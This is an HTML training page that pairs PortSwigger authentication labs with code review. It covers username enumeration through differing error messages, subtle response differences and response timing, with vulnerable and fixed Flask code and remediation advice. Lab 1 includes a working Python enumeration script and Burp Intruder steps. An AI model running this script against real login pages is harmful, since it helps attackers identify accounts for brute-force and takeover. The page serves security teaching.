<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authentication Code Review Playground | Security Learning</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
    <style>
        :root {
            --bg-primary: #0a0e17;
            --bg-secondary: #131a2b;
            --bg-tertiary: #1a2540;
            --accent-red: #ff4757;
            --accent-green: #2ed573;
            --accent-blue: #3742fa;
            --accent-yellow: #ffa502;
            --accent-purple: #8b5cf6;
            --text-primary: #e2e8f0;
            --text-secondary: #94a3b8;
            --border-color: #2a3a5c;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            min-height: 100vh;
            overflow-x: hidden;
        }

        /* Header */
        .header {
            background: linear-gradient(135deg, var(--bg-secondary) 0%, var(--bg-tertiary) 100%);
            padding: 20px 40px;
            border-bottom: 1px solid var(--border-color);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .header h1 {
            font-size: 1.8rem;
            background: linear-gradient(135deg, var(--accent-red), var(--accent-purple));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .header-badge {
            display: flex;
            gap: 10px;
        }

        .badge {
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 600;
            text-transform: uppercase;
        }

        .badge-lab {
            background: rgba(255, 71, 87, 0.2);
            color: var(--accent-red);
            border: 1px solid var(--accent-red);
        }

        .badge-realworld {
            background: rgba(139, 92, 246, 0.2);
            color: var(--accent-purple);
            border: 1px solid var(--accent-purple);
        }

        /* Main Layout */
        .main-container {
            display: flex;
            height: calc(100vh - 80px);
        }

        /* Sidebar */
        .sidebar {
            width: 320px;
            background: var(--bg-secondary);
            border-right: 1px solid var(--border-color);
            overflow-y: auto;
            padding: 20px 0;
        }

        .sidebar-section {
            margin-bottom: 25px;
        }

        .sidebar-title {
            padding: 10px 20px;
            font-size: 0.75rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: var(--text-secondary);
            font-weight: 600;
        }

        .lab-item {
            padding: 12px 20px;
            cursor: pointer;
            border-left: 3px solid transparent;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .lab-item:hover {
            background: var(--bg-tertiary);
            border-left-color: var(--accent-purple);
        }

        .lab-item.active {
            background: var(--bg-tertiary);
            border-left-color: var(--accent-red);
        }

        .lab-item i {
            font-size: 1.1rem;
            width: 24px;
            text-align: center;
        }

        .lab-item .lab-name {
            flex: 1;
            font-size: 0.9rem;
        }

        .lab-item .difficulty {
            font-size: 0.65rem;
            padding: 3px 8px;
            border-radius: 10px;
            text-transform: uppercase;
            font-weight: 600;
        }

        .difficulty.apprentice {
            background: rgba(46, 213, 115, 0.2);
            color: var(--accent-green);
        }

        .difficulty.practitioner {
            background: rgba(255, 165, 2, 0.2);
            color: var(--accent-yellow);
        }

        .difficulty.expert {
            background: rgba(255, 71, 87, 0.2);
            color: var(--accent-red);
        }

        /* Content Area */
        .content-area {
            flex: 1;
            overflow-y: auto;
            padding: 30px 40px;
        }

        /* Lab Header */
        .lab-header {
            margin-bottom: 30px;
        }

        .lab-header h2 {
            font-size: 1.6rem;
            margin-bottom: 10px;
            color: var(--text-primary);
        }

        .lab-meta {
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
            margin-bottom: 15px;
        }

        .meta-item {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 0.85rem;
            color: var(--text-secondary);
        }

        .meta-item i {
            color: var(--accent-purple);
        }

        .lab-description {
            color: var(--text-secondary);
            line-height: 1.7;
            font-size: 0.95rem;
        }

        /* Vulnerability Explanation */
        .vuln-section {
            background: var(--bg-secondary);
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid var(--border-color);
        }

        .vuln-section h3 {
            font-size: 1.1rem;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .vuln-section h3 i {
            color: var(--accent-red);
        }

        .vuln-list {
            list-style: none;
            padding-left: 0;
        }

        .vuln-list li {
            padding: 8px 0;
            padding-left: 25px;
            position: relative;
            color: var(--text-secondary);
            line-height: 1.6;
        }

        .vuln-list li::before {
            content: '▸';
            position: absolute;
            left: 0;
            color: var(--accent-red);
        }

        /* Code Review Section */
        .code-review-section {
            margin-bottom: 30px;
        }

        .code-tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }

        .code-tab {
            padding: 10px 20px;
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.85rem;
            color: var(--text-secondary);
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .code-tab:hover {
            border-color: var(--accent-purple);
        }

        .code-tab.active {
            background: var(--accent-red);
            border-color: var(--accent-red);
            color: white;
        }

        .code-tab.secure.active {
            background: var(--accent-green);
            border-color: var(--accent-green);
        }

        .code-container {
            position: relative;
            background: #1e1e1e;
            border-radius: 12px;
            overflow: hidden;
            border: 1px solid var(--border-color);
        }

        .code-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 20px;
            background: var(--bg-tertiary);
            border-bottom: 1px solid var(--border-color);
        }

        .code-filename {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 0.85rem;
            color: var(--text-secondary);
        }

        .code-filename i {
            color: var(--accent-yellow);
        }

        .code-actions {
            display: flex;
            gap: 10px;
        }

        .code-action-btn {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            color: var(--text-secondary);
            padding: 6px 12px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.8rem;
            transition: all 0.3s ease;
        }

        .code-action-btn:hover {
            background: var(--accent-purple);
            border-color: var(--accent-purple);
            color: white;
        }

        .code-block {
            padding: 20px;
            overflow-x: auto;
            max-height: 500px;
            overflow-y: auto;
        }

        .code-block pre {
            margin: 0;
            font-family: 'Fira Code', 'Consolas', monospace;
            font-size: 0.9rem;
            line-height: 1.6;
        }

        .code-block code {
            font-family: inherit;
        }

        /* Vulnerability Markers */
        .vuln-line {
            background: rgba(255, 71, 87, 0.15);
            display: block;
            margin: 0 -20px;
            padding: 0 20px;
            border-left: 3px solid var(--accent-red);
        }

        .secure-line {
            background: rgba(46, 213, 115, 0.15);
            display: block;
            margin: 0 -20px;
            padding: 0 20px;
            border-left: 3px solid var(--accent-green);
        }

        /* Analysis Panel */
        .analysis-panel {
            background: var(--bg-secondary);
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid var(--border-color);
        }

        .analysis-panel h3 {
            font-size: 1.1rem;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
            color: var(--accent-yellow);
        }

        .analysis-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 20px;
        }

        .analysis-card {
            background: var(--bg-tertiary);
            border-radius: 10px;
            padding: 20px;
            border: 1px solid var(--border-color);
        }

        .analysis-card h4 {
            font-size: 0.9rem;
            color: var(--accent-purple);
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .analysis-card p, .analysis-card ul {
            font-size: 0.85rem;
            color: var(--text-secondary);
            line-height: 1.7;
        }

        .analysis-card ul {
            padding-left: 20px;
        }

        .analysis-card li {
            margin-bottom: 6px;
        }

        /* Attack Flow */
        .attack-flow {
            background: var(--bg-secondary);
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid var(--border-color);
        }

        .attack-flow h3 {
            font-size: 1.1rem;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
            color: var(--accent-red);
        }

        .flow-steps {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .flow-step {
            display: flex;
            align-items: flex-start;
            gap: 15px;
            padding: 15px;
            background: var(--bg-tertiary);
            border-radius: 10px;
            border-left: 3px solid var(--accent-purple);
        }

        .step-number {
            width: 32px;
            height: 32px;
            background: var(--accent-purple);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 600;
            font-size: 0.9rem;
            flex-shrink: 0;
        }

        .step-content h4 {
            font-size: 0.95rem;
            margin-bottom: 6px;
            color: var(--text-primary);
        }

        .step-content p {
            font-size: 0.85rem;
            color: var(--text-secondary);
            line-height: 1.6;
        }

        .step-content code {
            background: var(--bg-primary);
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 0.8rem;
            color: var(--accent-yellow);
        }

        /* Payload Section */
        .payload-section {
            background: var(--bg-secondary);
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid var(--border-color);
        }

        .payload-section h3 {
            font-size: 1.1rem;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
            color: var(--accent-green);
        }

        .payload-box {
            background: #1e1e1e;
            border-radius: 8px;
            padding: 15px 20px;
            margin-bottom: 15px;
            border: 1px solid var(--border-color);
            font-family: 'Fira Code', monospace;
            font-size: 0.85rem;
            color: var(--accent-yellow);
            overflow-x: auto;
            position: relative;
        }

        .payload-box .payload-label {
            position: absolute;
            top: -10px;
            left: 15px;
            background: var(--bg-secondary);
            padding: 2px 10px;
            font-size: 0.7rem;
            color: var(--text-secondary);
            border-radius: 4px;
            font-family: 'Segoe UI', sans-serif;
        }

        /* Real World Section */
        .realworld-section {
            background: linear-gradient(135deg, rgba(139, 92, 246, 0.1), rgba(255, 71, 87, 0.1));
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid var(--accent-purple);
        }

        .realworld-section h3 {
            font-size: 1.1rem;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
            color: var(--accent-purple);
        }

        .realworld-case {
            background: var(--bg-tertiary);
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 15px;
        }

        .realworld-case:last-child {
            margin-bottom: 0;
        }

        .realworld-case h4 {
            font-size: 0.95rem;
            color: var(--text-primary);
            margin-bottom: 10px;
        }

        .realworld-case p {
            font-size: 0.85rem;
            color: var(--text-secondary);
            line-height: 1.7;
        }

        .realworld-case .bounty {
            display: inline-block;
            margin-top: 10px;
            padding: 4px 12px;
            background: rgba(46, 213, 115, 0.2);
            color: var(--accent-green);
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 600;
        }

        /* Remediation Section */
        .remediation-section {
            background: var(--bg-secondary);
            border-radius: 12px;
            padding: 25px;
            border: 1px solid var(--border-color);
        }

        .remediation-section h3 {
            font-size: 1.1rem;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
            color: var(--accent-green);
        }

        .remediation-list {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
        }

        .remediation-item {
            display: flex;
            align-items: flex-start;
            gap: 12px;
            padding: 15px;
            background: var(--bg-tertiary);
            border-radius: 8px;
        }

        .remediation-item i {
            color: var(--accent-green);
            margin-top: 3px;
        }

        .remediation-item p {
            font-size: 0.85rem;
            color: var(--text-secondary);
            line-height: 1.6;
        }

        /* Hidden content */
        .hidden {
            display: none !important;
        }

        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }

        ::-webkit-scrollbar-track {
            background: var(--bg-primary);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--border-color);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--accent-purple);
        }

        /* Coming Soon Badge */
        .coming-soon {
            opacity: 0.5;
            pointer-events: none;
            position: relative;
        }

        .coming-soon::after {
            content: 'COMING SOON';
            position: absolute;
            right: 20px;
            font-size: 0.6rem;
            background: var(--bg-tertiary);
            padding: 2px 8px;
            border-radius: 4px;
            color: var(--text-secondary);
        }

        /* Interactive Hints */
        .hint-toggle {
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            color: var(--text-secondary);
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.85rem;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
            transition: all 0.3s ease;
        }

        .hint-toggle:hover {
            border-color: var(--accent-yellow);
            color: var(--accent-yellow);
        }

        .hint-content {
            background: rgba(255, 165, 2, 0.1);
            border: 1px solid var(--accent-yellow);
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
        }

        .hint-content p {
            font-size: 0.9rem;
            color: var(--text-secondary);
            line-height: 1.7;
        }

        /* Language tabs for code */
        .language-tabs {
            display: flex;
            gap: 5px;
            margin-bottom: 15px;
            flex-wrap: wrap;
        }

        .lang-tab {
            padding: 8px 16px;
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.8rem;
            color: var(--text-secondary);
            transition: all 0.3s ease;
        }

        .lang-tab:hover {
            border-color: var(--accent-blue);
        }

        .lang-tab.active {
            background: var(--accent-blue);
            border-color: var(--accent-blue);
            color: white;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1><i class="fas fa-shield-alt"></i> Authentication Code Review Playground</h1>
        <div class="header-badge">
            <span class="badge badge-lab">PortSwigger Labs</span>
            <span class="badge badge-realworld">Real-World CVEs</span>
        </div>
    </div>

    <div class="main-container">
        <div class="sidebar">
            <div class="sidebar-section">
                <div class="sidebar-title">Password Change Abuse</div>
                <div class="lab-item active" data-lab="password-change-bruteforce">
                    <i class="fas fa-key"></i>
                    <span class="lab-name">Password Brute-force via Password Change</span>
                    <span class="difficulty practitioner">Practitioner</span>
                </div>
            </div>

            <div class="sidebar-section">
                <div class="sidebar-title">Username Enumeration</div>
                <div class="lab-item" data-lab="username-enum-different">
                    <i class="fas fa-user-secret"></i>
                    <span class="lab-name">Via Different Responses</span>
                    <span class="difficulty apprentice">Apprentice</span>
                </div>
                <div class="lab-item" data-lab="username-enum-subtle">
                    <i class="fas fa-user-secret"></i>
                    <span class="lab-name">Via Subtle Differences</span>
                    <span class="difficulty practitioner">Practitioner</span>
                </div>
                <div class="lab-item" data-lab="username-enum-timing">
                    <i class="fas fa-clock"></i>
                    <span class="lab-name">Via Response Timing</span>
                    <span class="difficulty practitioner">Practitioner</span>
                </div>
                <div class="lab-item" data-lab="username-enum-lock">
                    <i class="fas fa-lock"></i>
                    <span class="lab-name">Via Account Lock</span>
                    <span class="difficulty practitioner">Practitioner</span>
                </div>
            </div>

            <div class="sidebar-section">
                <div class="sidebar-title">Brute-Force Protection</div>
                <div class="lab-item" data-lab="bruteforce-ip-block">
                    <i class="fas fa-ban"></i>
                    <span class="lab-name">IP Block Bypass</span>
                    <span class="difficulty practitioner">Practitioner</span>
                </div>
                <div class="lab-item" data-lab="bruteforce-multiple-creds">
                    <i class="fas fa-list"></i>
                    <span class="lab-name">Multiple Credentials</span>
                    <span class="difficulty expert">Expert</span>
                </div>
            </div>

            <div class="sidebar-section">
                <div class="sidebar-title">2FA Bypass</div>
                <div class="lab-item" data-lab="2fa-simple">
                    <i class="fas fa-mobile-alt"></i>
                    <span class="lab-name">Simple 2FA Bypass</span>
                    <span class="difficulty apprentice">Apprentice</span>
                </div>
                <div class="lab-item" data-lab="2fa-broken-logic">
                    <i class="fas fa-bug"></i>
                    <span class="lab-name">Broken 2FA Logic</span>
                    <span class="difficulty practitioner">Practitioner</span>
                </div>
                <div class="lab-item" data-lab="2fa-bruteforce">
                    <i class="fas fa-hammer"></i>
                    <span class="lab-name">2FA Brute-Force</span>
                    <span class="difficulty expert">Expert</span>
                </div>
            </div>

            <div class="sidebar-section">
                <div class="sidebar-title">Session & Cookies</div>
                <div class="lab-item" data-lab="stay-logged-in">
                    <i class="fas fa-cookie"></i>
                    <span class="lab-name">Stay-Logged-In Cookie</span>
                    <span class="difficulty practitioner">Practitioner</span>
                </div>
                <div class="lab-item" data-lab="offline-cracking">
                    <i class="fas fa-database"></i>
                    <span class="lab-name">Offline Password Cracking</span>
                    <span class="difficulty practitioner">Practitioner</span>
                </div>
            </div>

            <div class="sidebar-section">
                <div class="sidebar-title">Password Reset</div>
                <div class="lab-item" data-lab="reset-broken-logic">
                    <i class="fas fa-undo"></i>
                    <span class="lab-name">Broken Reset Logic</span>
                    <span class="difficulty apprentice">Apprentice</span>
                </div>
                <div class="lab-item" data-lab="reset-poisoning">
                    <i class="fas fa-skull-crossbones"></i>
                    <span class="lab-name">Reset Poisoning</span>
                    <span class="difficulty practitioner">Practitioner</span>
                </div>
            </div>

            <div class="sidebar-section">
                <div class="sidebar-title">Real-World Vulns</div>
                <div class="lab-item coming-soon" data-lab="jwt-none-alg">
                    <i class="fas fa-id-badge"></i>
                    <span class="lab-name">JWT None Algorithm</span>
                    <span class="difficulty practitioner">Practitioner</span>
                </div>
                <div class="lab-item coming-soon" data-lab="oauth-misconfig">
                    <i class="fab fa-google"></i>
                    <span class="lab-name">OAuth Misconfiguration</span>
                    <span class="difficulty practitioner">Practitioner</span>
                </div>
            </div>
        </div>

        <div class="content-area">
            <!-- Lab 1: Username Enumeration via Different Responses -->
            <div id="username-enum-different" class="lab-content hidden">
                <div class="lab-header">
                    <h2><i class="fas fa-user-secret"></i> Lab 1: Username Enumeration via Different Responses</h2>
                    <div class="lab-meta">
                        <div class="meta-item">
                            <i class="fas fa-layer-group"></i>
                            <span>PortSwigger Web Security Academy</span>
                        </div>
                        <div class="meta-item">
                            <i class="fas fa-signal"></i>
                            <span>Difficulty: Apprentice</span>
                        </div>
                        <div class="meta-item">
                            <i class="fas fa-tag"></i>
                            <span>Username Enumeration</span>
                        </div>
                    </div>
                    <p class="lab-description">
                        This lab is vulnerable to username enumeration. The application returns different error messages
                        depending on whether the username exists or not, allowing attackers to build a list of valid usernames
                        before attempting password brute-force attacks.
                    </p>
                </div>

                <!-- Vulnerability Explanation -->
                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
                    <ul class="vuln-list">
                        <li>Login form returns <strong>"Invalid username"</strong> when username doesn't exist</li>
                        <li>Login form returns <strong>"Incorrect password"</strong> when username exists but password is wrong</li>
                        <li>This difference allows attackers to enumerate valid usernames</li>
                        <li>Once valid usernames are known, targeted password attacks become feasible</li>
                        <li>No rate limiting allows rapid enumeration of username lists</li>
                    </ul>
                </div>

                <!-- Code Review Section -->
                <div class="code-review-section">
                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code Review</h3>

                    <div class="code-tabs">
                        <button class="code-tab active" data-view="vulnerable" data-lab="lab1">
                            <i class="fas fa-exclamation-triangle"></i> Vulnerable Code
                        </button>
                        <button class="code-tab secure" data-view="secure" data-lab="lab1">
                            <i class="fas fa-shield-alt"></i> Secure Code
                        </button>
                    </div>

                    <!-- Vulnerable Code -->
                    <div class="code-container" id="lab1-vulnerable">
                        <div class="code-header">
                            <div class="code-filename">
                                <i class="fab fa-python"></i>
                                <span>login_controller.py</span>
                            </div>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-python">@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    # Fetch user from database
    user = User.query.filter_by(username=username).first()

    # VULNERABILITY: Different error messages reveal username validity
<span class="vuln-line">    if not user:</span>
<span class="vuln-line">        return render_template('login.html', </span>
<span class="vuln-line">                               error='Invalid username')  # ❌ Reveals username doesn't exist</span>

<span class="vuln-line">    if not check_password_hash(user.password, password):</span>
<span class="vuln-line">        return render_template('login.html',</span>
<span class="vuln-line">                               error='Incorrect password')  # ❌ Confirms username EXISTS</span>

    # Login successful
    session['user_id'] = user.id
    return redirect('/dashboard')</code></pre>
                        </div>
                    </div>

                    <!-- Secure Code -->
                    <div class="code-container hidden" id="lab1-secure">
                        <div class="code-header">
                            <div class="code-filename">
                                <i class="fab fa-python"></i>
                                <span>login_controller.py (Secure)</span>
                            </div>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-python">@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    user = User.query.filter_by(username=username).first()

    # ✅ FIX: Use identical error message for all failures
<span class="secure-line">    # Always perform password check to prevent timing attacks</span>
<span class="secure-line">    if user:</span>
<span class="secure-line">        password_valid = check_password_hash(user.password, password)</span>
<span class="secure-line">    else:</span>
<span class="secure-line">        # Perform dummy hash to maintain consistent timing</span>
<span class="secure-line">        check_password_hash(DUMMY_HASH, password)</span>
<span class="secure-line">        password_valid = False</span>

<span class="secure-line">    if not user or not password_valid:</span>
<span class="secure-line">        log_failed_login(username, request.remote_addr)</span>
<span class="secure-line">        return render_template('login.html',</span>
<span class="secure-line">                               error='Invalid username or password')  # ✅ Generic message</span>

    session['user_id'] = user.id
    return redirect('/dashboard')</code></pre>
                        </div>
                    </div>
                </div>

                <!-- Attack Flow -->
                <div class="attack-flow">
                    <h3><i class="fas fa-route"></i> Attack Flow</h3>
                    <div class="flow-steps">
                        <div class="flow-step">
                            <div class="step-number">1</div>
                            <div class="step-content">
                                <h4>Intercept Login Request</h4>
                                <p>Capture a login POST request using Burp Suite proxy.</p>
                            </div>
                        </div>
                        <div class="flow-step">
                            <div class="step-number">2</div>
                            <div class="step-content">
                                <h4>Send to Intruder</h4>
                                <p>Mark the <code>username</code> parameter as the payload position. Use a wordlist of common usernames.</p>
                            </div>
                        </div>
                        <div class="flow-step">
                            <div class="step-number">3</div>
                            <div class="step-content">
                                <h4>Analyze Responses</h4>
                                <p>Filter by response containing <code>"Incorrect password"</code> - these are valid usernames!</p>
                            </div>
                        </div>
                        <div class="flow-step">
                            <div class="step-number">4</div>
                            <div class="step-content">
                                <h4>Brute-Force Password</h4>
                                <p>Use discovered username to perform targeted password attack.</p>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Payloads -->
                <div class="payload-section">
                    <h3><i class="fas fa-code"></i> Attack Payloads</h3>
                    <div class="payload-box">
                        <span class="payload-label">Burp Intruder Grep Match</span>
# Response indicating VALID username:
"Incorrect password"

# Response indicating INVALID username:
"Invalid username"
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Python Enumeration Script</span>
import requests

url = "https://target.com/login"
usernames = open('usernames.txt').read().splitlines()
valid_users = []

for username in usernames:
    data = {'username': username, 'password': 'test123'}
    response = requests.post(url, data=data)

    if 'Incorrect password' in response.text:
        print(f'[+] Valid username: {username}')
        valid_users.append(username)
    elif 'Invalid username' in response.text:
        print(f'[-] Invalid: {username}')
                    </div>
                </div>

                <!-- Remediation -->
                <div class="remediation-section">
                    <h3><i class="fas fa-shield-alt"></i> Remediation</h3>
                    <div class="remediation-list">
                        <div class="remediation-item">
                            <i class="fas fa-check-circle"></i>
                            <p><strong>Generic Error Messages:</strong> Use "Invalid username or password" for all authentication failures.</p>
                        </div>
                        <div class="remediation-item">
                            <i class="fas fa-check-circle"></i>
                            <p><strong>Consistent Timing:</strong> Always perform password hash comparison to prevent timing-based enumeration.</p>
                        </div>
                        <div class="remediation-item">
                            <i class="fas fa-check-circle"></i>
                            <p><strong>Rate Limiting:</strong> Implement progressive delays or CAPTCHA after failed attempts.</p>
                        </div>
                        <div class="remediation-item">
                            <i class="fas fa-check-circle"></i>
                            <p><strong>Account Lockout:</strong> Temporarily lock accounts after multiple failed login attempts.</p>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Lab 2: Username Enumeration via Subtly Different Responses -->
            <div id="username-enum-subtle" class="lab-content hidden">
                <div class="lab-header">
                    <h2><i class="fas fa-user-secret"></i> Lab 2: Username Enumeration via Subtly Different Responses</h2>
                    <div class="lab-meta">
                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
                        <div class="meta-item"><i class="fas fa-tag"></i><span>Username Enumeration</span></div>
                    </div>
                    <p class="lab-description">
                        This lab has a subtle difference in error messages - a trailing period or space. Attackers must carefully compare responses
                        to identify valid usernames through minor text variations.
                    </p>
                </div>

                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
                    <ul class="vuln-list">
                        <li>Invalid username returns: <code>"Invalid username or password."</code> (with period)</li>
                        <li>Valid username returns: <code>"Invalid username or password"</code> (no period)</li>
                        <li>Subtle differences like trailing spaces, punctuation, or HTML whitespace</li>
                        <li>Response length differs by 1-2 bytes - easy to miss without tools</li>
                    </ul>
                </div>

                <div class="code-review-section">
                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code Review</h3>
                    <div class="code-tabs">
                        <button class="code-tab active" data-view="vulnerable" data-lab="lab2"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
                        <button class="code-tab secure" data-view="secure" data-lab="lab2"><i class="fas fa-shield-alt"></i> Secure Code</button>
                    </div>
                    <div class="code-container" id="lab2-vulnerable">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python">@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    user = User.query.filter_by(username=username).first()

    # VULNERABILITY: Subtle difference in error messages
<span class="vuln-line">    if not user:</span>
<span class="vuln-line">        # Note the period at the end!</span>
<span class="vuln-line">        return jsonify({'error': 'Invalid username or password.'}), 401</span>

<span class="vuln-line">    if not verify_password(user.password, password):</span>
<span class="vuln-line">        # No period here - subtle but exploitable!</span>
<span class="vuln-line">        return jsonify({'error': 'Invalid username or password'}), 401</span>

    return jsonify({'success': True, 'token': generate_token(user)})</code></pre>
                        </div>
                    </div>
                    <div class="code-container hidden" id="lab2-secure">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py (Secure)</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python"># ✅ Define error message as constant
<span class="secure-line">AUTH_ERROR_MSG = 'Invalid username or password'</span>

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    user = User.query.filter_by(username=username).first()

    # ✅ FIX: Use same constant for ALL error responses
<span class="secure-line">    if user:</span>
<span class="secure-line">        password_valid = verify_password(user.password, password)</span>
<span class="secure-line">    else:</span>
<span class="secure-line">        verify_password(DUMMY_HASH, password)  # Timing protection</span>
<span class="secure-line">        password_valid = False</span>

<span class="secure-line">    if not user or not password_valid:</span>
<span class="secure-line">        return jsonify({'error': AUTH_ERROR_MSG}), 401  # ✅ Consistent</span>

    return jsonify({'success': True, 'token': generate_token(user)})</code></pre>
                        </div>
                    </div>
                </div>

                <div class="attack-flow">
                    <h3><i class="fas fa-route"></i> Attack Flow</h3>
                    <div class="flow-steps">
                        <div class="flow-step"><div class="step-number">1</div><div class="step-content"><h4>Capture Login Request</h4><p>Intercept POST request to /login endpoint.</p></div></div>
                        <div class="flow-step"><div class="step-number">2</div><div class="step-content"><h4>Send to Intruder</h4><p>Set username as payload position with wordlist.</p></div></div>
                        <div class="flow-step"><div class="step-number">3</div><div class="step-content"><h4>Compare Response Lengths</h4><p>Sort by response length - valid usernames will have slightly different byte count.</p></div></div>
                        <div class="flow-step"><div class="step-number">4</div><div class="step-content"><h4>Identify Valid Username</h4><p>The response with different length contains the valid username.</p></div></div>
                    </div>
                </div>

                <div class="payload-section">
                    <h3><i class="fas fa-code"></i> Detection Tips</h3>
                    <div class="payload-box">
                        <span class="payload-label">Burp Comparer Method</span>
# 1. Send two requests with different usernames
# 2. Right-click responses > Send to Comparer
# 3. Look for subtle differences:
#    - Trailing periods, spaces, or newlines
#    - Different HTML whitespace
#    - Capitalization differences
                    </div>
                </div>

                <div class="remediation-section">
                    <h3><i class="fas fa-shield-alt"></i> Remediation</h3>
                    <div class="remediation-list">
                        <div class="remediation-item"><i class="fas fa-check-circle"></i><p><strong>Use Constants:</strong> Define error messages as constants and reuse them everywhere.</p></div>
                        <div class="remediation-item"><i class="fas fa-check-circle"></i><p><strong>Code Review:</strong> Review all authentication paths for message consistency.</p></div>
                        <div class="remediation-item"><i class="fas fa-check-circle"></i><p><strong>Automated Testing:</strong> Add tests that verify identical responses for auth failures.</p></div>
                    </div>
                </div>
            </div>

            <!-- Lab 3: Username Enumeration via Response Timing -->
            <div id="username-enum-timing" class="lab-content hidden">
                <div class="lab-header">
                    <h2><i class="fas fa-clock"></i> Lab 3: Username Enumeration via Response Timing</h2>
                    <div class="lab-meta">
                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
                    </div>
                    <p class="lab-description">
                        The application performs expensive password validation only when the username exists.
                        Valid usernames cause longer response times due to bcrypt/password hashing operations.
                    </p>
                </div>
                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
                    <ul class="vuln-list">
                        <li>Password hashing (bcrypt/scrypt) is computationally expensive</li>
                        <li>Application only hashes password if username exists in database</li>
                        <li>Valid username: ~500ms response (hash computed)</li>
                        <li>Invalid username: ~50ms response (no hash computed)</li>
                        <li>Use very long password to amplify timing difference</li>
                    </ul>
                </div>
                <div class="code-review-section">
                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Code Review</h3>
                    <div class="code-tabs">
